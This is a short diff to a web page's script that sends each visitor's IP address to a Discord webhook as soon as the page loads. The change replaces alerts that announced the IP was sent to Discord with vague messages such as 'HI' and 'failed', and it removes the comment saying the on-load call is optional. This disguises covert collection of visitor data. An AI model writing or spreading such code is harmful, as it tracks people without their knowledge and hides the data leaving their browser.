@@ -30,20 +30,18 @@
                         if (!response.ok) {
                             throw new Error('Failed to send IP address to webhook');
                         }
-                        alert('IP address sent to Discord webhook successfully!');
+                        alert('HI');
                     })
                     .catch(error => {
                         console.error('Error:', error);
-                        alert('Failed to send IP address to Discord webhook');
+                        alert('failed');
                     });
                 })
                 .catch(error => {
                     console.error('Error:', error);
-                    alert('Failed to retrieve IP address');
+                    alert('Failed to retrieve');
                 });
         }
-
-        // Call the function to send IP on page load (optional)
         sendIPToWebhook();
     </script>
 </body>
